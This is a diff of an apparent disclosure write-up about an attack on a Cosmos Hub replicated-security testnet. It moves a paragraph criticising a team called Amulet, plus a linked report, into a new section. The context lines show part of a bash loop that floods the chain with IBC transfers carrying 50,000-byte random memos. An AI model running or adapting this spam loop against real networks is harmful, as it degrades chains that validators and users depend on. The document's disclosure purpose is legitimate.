@@ -47,11 +47,8 @@
   
  
 
-It is my strong belief that Amulet does not understand the nature of the situation because they've failed to communicate with the numerous teams involved.  If they were to even just sync the cosmos hub replicated security testnet, they would immediately see that it is still suffering from the previous attack. 
 
-Amulet seems to have not understood that there are numerous issues at play, despite being in possession of this report:
 
-https://docs.google.com/document/d/1oCjsVYMaV77etxOEbDxh58vkAQaXf7RAkhXvF_8GYis/edit
 
 
 
@@ -175,4 +172,12 @@ for i in $( eval echo {"$SEQUENCE"..10000000} )
          do gaiad tx ibc-transfer transfer transfer channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas auto --yes --sequence $i
          done
 ```
+
+
+## Amulet
+It is my strong belief that Amulet does not understand the nature of the situation because they've failed to communicate with the numerous teams involved.  If they were to even just sync the cosmos hub replicated security testnet, they would immediately see that it is still suffering from the previous attack. 
+
+Amulet seems to have not understood that there are numerous issues at play, despite being in possession of this report:
+
+https://docs.google.com/document/d/1oCjsVYMaV77etxOEbDxh58vkAQaXf7RAkhXvF_8GYis/edit
 
